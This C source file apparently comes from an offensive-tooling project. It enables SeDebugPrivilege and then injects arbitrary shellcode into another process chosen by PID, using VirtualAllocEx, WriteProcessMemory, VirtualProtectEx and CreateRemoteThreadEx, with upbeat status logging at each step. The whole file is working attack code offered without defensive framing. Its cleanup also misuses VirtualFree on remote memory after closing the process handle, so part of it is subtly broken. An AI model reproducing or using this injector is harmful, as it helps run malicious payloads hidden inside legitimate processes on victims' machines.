#include "injection.h"

BOOL SetSeDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tokenPriv;
    LUID luidDebug;
    INFO("YAY");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PRINT_ERROR("Failed to open process token");
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebug)) {
        PRINT_ERROR("Failed to look up privilege value");
        CloseHandle(hToken);
        return FALSE;
    }

    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luidDebug;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        PRINT_ERROR("Failed to adjust token privileges");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

BOOL ShellcodeInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL   State = TRUE;
    DWORD  TID = 0;
    DWORD  OldProtection = 0;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle = NULL;
    PVOID  Buffer = NULL;

    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (NULL == ProcessHandle) {
        PRINT_ERROR("OpenProcess");
        return FALSE; /* no point in continuing if we can't even get a handle on the process */
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Buffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == Buffer) {
        PRINT_ERROR("VirtualAllocEx");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE [RW-] permissions!", Buffer);

    if (!WriteProcessMemory(ProcessHandle, Buffer, Payload, PayloadSize, 0)) {
        PRINT_ERROR("WriteProcessMemory");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer", Buffer, PayloadSize);

    if (!VirtualProtectEx(ProcessHandle, Buffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection)) {
        PRINT_ERROR("VirtualProtect");
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed buffer's permissions to PAGE_EXECUTE_READ [R-X]", Buffer);

    ThreadHandle = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, 0, &TID);
    if (NULL == ThreadHandle) {
        PRINT_ERROR("CreateRemoteThreadEx");
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread (%ld)!", ThreadHandle, TID);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    WaitForSingleObject(ThreadHandle, INFINITE);
    INFO("[0x%p] thread finished execution, beginning cleanup...", ThreadHandle);

CLEANUP:

    if (ThreadHandle) {
        CloseHandle(ThreadHandle);
        INFO("[0x%p] closed thread handle", ThreadHandle);
    }

    if (ProcessHandle) {
        CloseHandle(ProcessHandle);
        INFO("[0x%p] closed process handle", ProcessHandle);
    }

    if (Buffer) {
        VirtualFree(Buffer, 0, MEM_RELEASE);
        INFO("[0x%p] allocated buffer freed", Buffer);
    }

    return State;

}